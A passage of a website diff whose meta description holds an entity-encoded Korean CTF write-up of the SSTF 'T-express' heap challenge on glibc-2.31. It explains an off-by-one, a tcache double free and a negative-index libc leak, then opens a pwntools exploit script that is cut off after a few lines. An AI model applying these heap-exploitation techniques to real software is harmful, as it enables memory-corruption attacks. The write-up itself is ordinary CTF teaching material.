@@ -20,8 +20,175 @@
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[Write-Up] SSTF T-express - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h1 id=&#34;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34;&gt;&lt;a href=&#34;#&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&#34;&gt;&lt;/a&gt;&amp;#xBA38;&amp;#xB9BF;&amp;#xB9D0;&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC0BC;&amp;#xC131;&amp;#xC5D0;&amp;#xC11C; &amp;#xC8FC;&amp;#xCD5C;&amp;#xD55C; SSTF&amp;#xC5D0; &amp;#xCD9C;&amp;#xC804;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC870;&amp;#xAE08; &amp;#xB2A6;&amp;#xC740; &amp;#xAC10;&amp;#xC774; &amp;#xC788;&amp;#xC9C0;&amp;#xB9CC; T-express &amp;#xBB38;&amp;#xC81C; &amp;#xD480;&amp;#xC774;&amp;#xB97C; &amp;#xD574;&amp;#xBCFC;&amp;#xAE4C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. T-express &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xC5D0;&amp;#xBC84;&amp;#xB79C;&amp;#xB4DC; &amp;#xB85C;&amp;#xACE0;&amp;#xC758; &amp;#xC544;&amp;#xC2A4;&amp;#xD0A4; &amp;#xC544;&amp;#xD2B8;&amp;#xB85C; &amp;#xC800;&amp;#xD76C;&amp;#xB97C; &amp;#xB9DE;&amp;#xC774;&amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCF54;&amp;#xB85C;&amp;#xB098; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xC5B4;&amp;#xB514; &amp;#xB180;&amp;#xB7EC; &amp;#xAC00;&amp;#xC9C0;&amp;#xB3C4; &amp;#xBABB;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xC5C8;&amp;#xB294;&amp;#xB370; &amp;#xC628;&amp;#xB77C;&amp;#xC778;&amp;#xC73C;&amp;#xB85C; &amp;#xC5D0;&amp;#xBC84;&amp;#xB79C;&amp;#xB4DC;&amp;#xC5D0; &amp;#xAC00;&amp;#xBCF4;&amp;#xB124;&amp;#xC694;. &amp;#x314E;&amp;#x314E; &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image1.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;T-express &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB294; glibc-2.31&amp;#xC640; &amp;#xD568;&amp;#xAED8; &amp;#xC8FC;&amp;#xC5B4;&amp;#xC9C4; Heap&amp;#xBB38;&amp;#xC81C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. glibc-2.31&amp;#xB294; 2020&amp;#xB144; 2&amp;#xC6D4;&amp;#xC5D0; &amp;#xB9B4;&amp;#xB9AC;&amp;#xC988; &amp;#xB41C; &amp;#xBC84;&amp;#xC804;&amp;#xC778;&amp;#xB370;,  &amp;#xC800;&amp;#xB294; T-express&amp;#xB97C; &amp;#xD480;&amp;#xBA74;&amp;#xC11C; &amp;#xC774; &amp;#xBC84;&amp;#xC804;&amp;#xC758; tcache&amp;#xB97C; &amp;#xCC98;&amp;#xC74C; &amp;#xC811;&amp;#xD574;&amp;#xBD24;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB7F0; &amp;#xC800;&amp;#xC870;&amp;#xCC28; &amp;#xC5B4;&amp;#xB835;&amp;#xC9C0; &amp;#xC54A;&amp;#xAC8C; &amp;#xD480;&amp;#xB9CC;&amp;#xD07C; &amp;#xD06C;&amp;#xAC8C; &amp;#xC5B4;&amp;#xB835;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xC7AC;&amp;#xBC0C;&amp;#xAC8C; &amp;#xD480; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xBB38;&amp;#xC81C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;[&amp;#xCDE8;&amp;#xC57D;&amp;#xC810;]&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Off-By-One&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Double-Free&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Out-Of-Bound&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;&amp;#xD6D1;&amp;#xC5B4;&amp;#xBCF4;&amp;#xAE30;&#34;&gt;&lt;a href=&#34;#&amp;#xD6D1;&amp;#xC5B4;&amp;#xBCF4;&amp;#xAE30;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xD6D1;&amp;#xC5B4;&amp;#xBCF4;&amp;#xAE30;&#34;&gt;&lt;/a&gt;&amp;#xD6D1;&amp;#xC5B4;&amp;#xBCF4;&amp;#xAE30;&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image2.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD504;&amp;#xB85C;&amp;#xADF8;&amp;#xB7A8;&amp;#xC758; &amp;#xAE30;&amp;#xB2A5;&amp;#xC740; &amp;#xB300;&amp;#xCDA9; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC694;&amp;#xC57D;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xD2F0;&amp;#xCF13; &amp;#xAD6C;&amp;#xB9E4;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;One Ride &amp;#xD2F0;&amp;#xCF13; &amp;#x2192; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xD560;&amp;#xB2F9;&lt;/li&gt;
+&lt;li&gt;One Day &amp;#xD2F0;&amp;#xCF13; &amp;#x2192; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xD560;&amp;#xB2F9;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xBCF4;&amp;#xC720; &amp;#xC911;&amp;#xC778; &amp;#xD2F0;&amp;#xCF13; &amp;#xBCF4;&amp;#xAE30;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xD2F0;&amp;#xCF13; &amp;#xC0AC;&amp;#xC6A9;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;One Ride &amp;#xD2F0;&amp;#xCF13; &amp;#x2192; &amp;#xD560;&amp;#xB2F9; &amp;#xD574;&amp;#xC81C;&lt;/li&gt;
+&lt;li&gt;One Day &amp;#xD2F0;&amp;#xCF13; &amp;#x2192; &amp;#xD65C;&amp;#xB3D9; &amp;#xC120;&amp;#xD0DD; &amp;#x2192; &amp;#xBAA8;&amp;#xB4E0; &amp;#xD65C;&amp;#xB3D9; &amp;#xC0AC;&amp;#xC6A9; &amp;#x2192; &amp;#xD560;&amp;#xB2F9; &amp;#xD574;&amp;#xC81C;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&amp;#xC885;&amp;#xB8CC;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;Off-By-One&#34;&gt;&lt;a href=&#34;#Off-By-One&#34; class=&#34;headerlink&#34; title=&#34;Off-By-One&#34;&gt;&lt;/a&gt;Off-By-One&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image3.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xAD6C;&amp;#xB9E4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xD2F0;&amp;#xCF13;&amp;#xC758; &amp;#xC885;&amp;#xB958;&amp;#xB294; &amp;#xB450; &amp;#xAC00;&amp;#xC9C0;&amp;#xB85C; &amp;#xB098;&amp;#xB269;&amp;#xB2C8;&amp;#xB2E4;(One Ride Ticket / One Day Ticket). &amp;#xB450; &amp;#xD2F0;&amp;#xCF13;&amp;#xC740; 3&amp;#xAC00;&amp;#xC9C0; &amp;#xCC28;&amp;#xC774;&amp;#xC810;&amp;#xC774; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&amp;#xD560;&amp;#xB2F9; &amp;#xD06C;&amp;#xAE30;&lt;ul&gt;
+&lt;li&gt;One Ride &amp;#x2192; 0x18&lt;/li&gt;
+&lt;li&gt;One Day &amp;#x2192; 0x30&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&amp;#xD2F0;&amp;#xCF13; &amp;#xD0C0;&amp;#xC785;&lt;ul&gt;
+&lt;li&gt;One Ride &amp;#x2192; 1&lt;/li&gt;
+&lt;li&gt;One Day &amp;#x2192; 0&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&amp;#xD574;&amp;#xC81C; &amp;#xC870;&amp;#xAC74;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image4.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0x55d222efe2a0&lt;/code&gt; &amp;#xC5D0;&amp;#xB294; One Ride Ticket&amp;#xC774;, &lt;code&gt;0x55d222efe2c0&lt;/code&gt; &amp;#xC5D0;&amp;#xB294; One Day Ticket&amp;#xC774; &amp;#xD560;&amp;#xB2F9;&amp;#xB3FC;&amp;#xC788;&amp;#xB294; &amp;#xBAA8;&amp;#xC2B5;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD558;&amp;#xC774;&amp;#xB77C;&amp;#xC774;&amp;#xD2B8; &amp;#xB41C; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &lt;code&gt;ticket_type&lt;/code&gt;&amp;#xAC12;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.  &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xC9D1;&amp;#xC911;&amp;#xD574;&amp;#xC57C; &amp;#xD560; &amp;#xC810;&amp;#xC740; &lt;code&gt;lastname&lt;/code&gt; &amp;#xBC14;&amp;#xB85C; &amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0; &lt;code&gt;ticket_type&lt;/code&gt;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD55C;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image5.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;lastname&lt;/code&gt;&amp;#xC740; &amp;#xD2F0;&amp;#xCF13;&amp;#xC774; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xD6C4; &amp;#xD568;&amp;#xC218; &lt;code&gt;read_str()&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xC785;&amp;#xB825;&amp;#xC744; &amp;#xBC1B;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image6.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD568;&amp;#xC218; &lt;code&gt;read_str()&lt;/code&gt;&amp;#xC740; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC740; string &amp;#xB05D;&amp;#xC5D0; NULL&amp;#xC744; &amp;#xCD94;&amp;#xAC00;&amp;#xD558;&amp;#xB294; &amp;#xB8E8;&amp;#xD2F4;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB9CC;&amp;#xC57D; &lt;code&gt;lastname&lt;/code&gt;&amp;#xC5D0; &amp;#xC785;&amp;#xB825;&amp;#xBC1B;&amp;#xC744; &amp;#xB54C; 8byte&amp;#xB97C; &amp;#xAF49; &amp;#xCC44;&amp;#xC6CC; &amp;#xB123;&amp;#xB294;&amp;#xB2E4;&amp;#xBA74; &lt;code&gt;ticket_type&lt;/code&gt;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC624;&amp;#xC5FC;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image7.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;One Ride Ticket&amp;#xC758; &lt;code&gt;ticket_type&lt;/code&gt;&amp;#xC744; NULL(0x00)&amp;#xB85C; &amp;#xC624;&amp;#xC5FC;&amp;#xC2DC;&amp;#xD0A8; &amp;#xBAA8;&amp;#xC2B5;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB798;&amp;#xC11C; &amp;#xC774;&amp;#xAC78;&amp;#xB85C; &amp;#xBB34;&amp;#xC5BC; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB290;&amp;#xB0D0;? &lt;code&gt;ticket_type&lt;/code&gt;&amp;#xC744; &amp;#xC624;&amp;#xC5FC;&amp;#xC2DC;&amp;#xCF1C; 0&amp;#xC73C;&amp;#xB85C; &amp;#xBC14;&amp;#xAFB8;&amp;#xBA74; One Ride Ticket&amp;#xC744; One Day Ticket&amp;#xC778; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xC18D;&amp;#xC77C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image8.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD568;&amp;#xC218; &lt;code&gt;use_ticket()&lt;/code&gt;&amp;#xC758; &amp;#xC77C;&amp;#xBD80;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &lt;code&gt;ticket_type&lt;/code&gt;&amp;#xC5D0; &amp;#xB530;&amp;#xB77C; &amp;#xBD84;&amp;#xAE30;&amp;#xBB38;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2E4;&amp;#xD589;&amp;#xB418;&amp;#xB294; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xB2EC;&amp;#xB77C;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;. One Ride Ticket&amp;#xC5D0;&amp;#xB294; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &lt;code&gt;meal_ticket, safari_pass&lt;/code&gt;&amp;#xB4F1;&amp;#xC758; &amp;#xAC12;&amp;#xC744; &amp;#xC870;&amp;#xC791;&amp;#xD558;&amp;#xB294; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xC774;&amp;#xB294; &amp;#xCD94;&amp;#xAC00;&amp;#xB85C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC; &amp;#xC624;&amp;#xC5FC;&amp;#xC744; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;h1 id=&#34;Double-Free&#34;&gt;&lt;a href=&#34;#Double-Free&#34; class=&#34;headerlink&#34; title=&#34;Double Free&#34;&gt;&lt;/a&gt;Double Free&lt;/h1&gt;&lt;p&gt;glibc-2.31 &amp;#xBC84;&amp;#xC804;&amp;#xC758; tcache&amp;#xB294; double free&amp;#xB97C; &amp;#xAC80;&amp;#xC99D;&amp;#xD558;&amp;#xB294; &amp;#xCF54;&amp;#xB4DC;&amp;#xAC00; &amp;#xCD94;&amp;#xAC00; &amp;#xB410;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xC7AC;&amp;#xBC0C;&amp;#xB294; &amp;#xC810;&amp;#xC740; &amp;#xD06C;&amp;#xAE30;&amp;#xAC00; &amp;#xAC19;&amp;#xC740; tcache &amp;#xB07C;&amp;#xB9AC;&amp;#xB9CC; &amp;#xAC80;&amp;#xC99D;&amp;#xD55C;&amp;#xB2E4;&amp;#xB294; &amp;#xAC81;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB9CC;&amp;#xC57D; &amp;#xCCAD;&amp;#xD06C;&amp;#xC758; size&amp;#xB97C; &amp;#xC784;&amp;#xC758;&amp;#xB85C; &amp;#xC870;&amp;#xC791;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC774; &amp;#xC788;&amp;#xB2E4;&amp;#xBA74; &amp;#xAC19;&amp;#xC740; &amp;#xCCAD;&amp;#xD06C;&amp;#xB97C; &amp;#xB450; &amp;#xBC88; &amp;#xD574;&amp;#xC81C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image9.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;One Ride Ticket&amp;#xC758; &lt;code&gt;ticket_type&lt;/code&gt;&amp;#xC744; &lt;code&gt;0x00&lt;/code&gt;&amp;#xC73C;&amp;#xB85C; &amp;#xBC14;&amp;#xAFD4; &amp;#xD568;&amp;#xC218; &lt;code&gt;use_ticket()&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; One Day Ticket&amp;#xC778; &amp;#xAC83;&amp;#xCC98;&amp;#xB7FC; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB2E4;&amp;#xACE0; &amp;#xC124;&amp;#xBA85;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xC911; &lt;code&gt;meal_ticket&lt;/code&gt;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xBA74; &amp;#xB2E4;&amp;#xC74C; &amp;#xCCAD;&amp;#xD06C;&amp;#xC758; size&amp;#xAC12;&amp;#xC744; &amp;#xC624;&amp;#xC5FC;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image10.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image11.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image12.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xC124;&amp;#xBA85;&amp;#xD55C; &amp;#xB300;&amp;#xB85C; size&amp;#xAC12;&amp;#xC744; &amp;#xC624;&amp;#xC5FC;&amp;#xC2DC;&amp;#xD0A8; &amp;#xBAA8;&amp;#xC2B5;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. One Day Ticket&amp;#xC744; size&amp;#xAC00; 0x41&amp;#xC77C; &amp;#xB54C; &amp;#xD55C;&amp;#xBC88;, 0x21&amp;#xC77C; &amp;#xB54C; &amp;#xD55C;&amp;#xBC88; &amp;#xD560;&amp;#xB2F9; &amp;#xD574;&amp;#xC81C;&amp;#xB97C; &amp;#xD574;&amp;#xC8FC;&amp;#xBA74; Double Free&amp;#xAC00; &amp;#xB418;&amp;#xACA0;&amp;#xC8E0;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image13.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC9E0;! &amp;#xAC19;&amp;#xC740; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xB450; &amp;#xBC88; &amp;#xD574;&amp;#xC81C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xC81C; &amp;#xC6D0;&amp;#xD558;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; chunk&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD574; Arbitrary Write&amp;#xB97C; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;h1 id=&#34;Out-Of-Bound&#34;&gt;&lt;a href=&#34;#Out-Of-Bound&#34; class=&#34;headerlink&#34; title=&#34;Out-Of-Bound&#34;&gt;&lt;/a&gt;Out-Of-Bound&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image14.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xAD6C;&amp;#xB9E4;&amp;#xD55C; &amp;#xD2F0;&amp;#xCF13;&amp;#xC740; &lt;code&gt;passes&lt;/code&gt;&amp;#xB77C;&amp;#xB294; &amp;#xC774;&amp;#xB984;&amp;#xC758; &amp;#xBC30;&amp;#xC5F4;&amp;#xB85C; bss&amp;#xC601;&amp;#xC5ED;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAC01; &amp;#xD2F0;&amp;#xCF13;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; chunk&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; index&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574; &amp;#xC811;&amp;#xADFC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC704; &amp;#xC0AC;&amp;#xC9C4;&amp;#xC740; &amp;#xD568;&amp;#xC218; &lt;code&gt;view_ticket()&lt;/code&gt;&amp;#xC758; &amp;#xC77C;&amp;#xBD80;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC790;&amp;#xC138;&amp;#xD788; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; index&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xBD84;&amp;#xAE30;&amp;#xBB38;&amp;#xC5D0;&amp;#xC11C; &amp;#xC74C;&amp;#xC218;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC608;&amp;#xC678;&amp;#xCC98;&amp;#xB9AC;&amp;#xB97C; &amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image15.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xB9CC;&amp;#xC57D; &lt;code&gt;passes&lt;/code&gt; &amp;#xBCF4;&amp;#xB2E4; &amp;#xB0AE;&amp;#xC740; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC911;&amp;#xC694;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;&amp;#xAC00; &amp;#xC788;&amp;#xB2E4;&amp;#xBA74; Out-Of-Bound&amp;#xB85C; &amp;#xCD9C;&amp;#xB825;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB9AC;&amp;#xACE0; &amp;#xBC30;&amp;#xC5F4; &lt;code&gt;passes&lt;/code&gt;&amp;#xBCF4;&amp;#xB2E4; &amp;#xC870;&amp;#xAE08; &amp;#xB0AE;&amp;#xC740; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;stderr@@GLIBC&lt;/code&gt;&amp;#xAC00; &amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC78; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2020/10/18/fabu1ous/sstf-t-express/image16.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD568;&amp;#xC218; &lt;code&gt;view_ticket()&lt;/code&gt;&amp;#xC5D0; -4&amp;#xB97C; index&amp;#xB85C; &amp;#xC785;&amp;#xB825;&amp;#xD55C;&amp;#xB2E4;&amp;#xBA74; &lt;code&gt;stderr@@GLIBC&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; libc&amp;#xC758; base address&amp;#xB97C; leak &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;h1 id=&#34;Exploit&#34;&gt;&lt;a href=&#34;#Exploit&#34; class=&#34;headerlink&#34; title=&#34;Exploit&#34;&gt;&lt;/a&gt;Exploit&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt;*
+
+&lt;span class=&#34;hljs-comment&#34;&gt;#p = remote(&amp;apos;t-express.sstf.site&amp;apos;, &amp;apos;1337&amp;apos;)&lt;/span&gt;
+p = process(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./target&amp;apos;&lt;/span&gt;)
+e = ELF(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;./target&amp;apos;&lt;/span&gt;)
+
+&lt;span class=&#34;hljs-comment&#34;&gt;#context.log_level=&amp;apos;debug&amp;apos;&lt;/span&gt;
+&lt;span class=&#34;hljs-comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;
+
+&lt;span class=&#34;hljs-comment&#34;&gt;# init&lt;/span&gt;
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2): &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;First name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;AAAA&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;Last name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;AAAAAAAA&amp;apos;&lt;/span&gt;)
+
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;choice: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;1&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;(1/2): &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;2&amp;apos;&lt;/span&gt;)
+p.sendlineafter(&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;First name: &amp;apos;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;BBBB&amp;apos;&lt;/span&gt;)
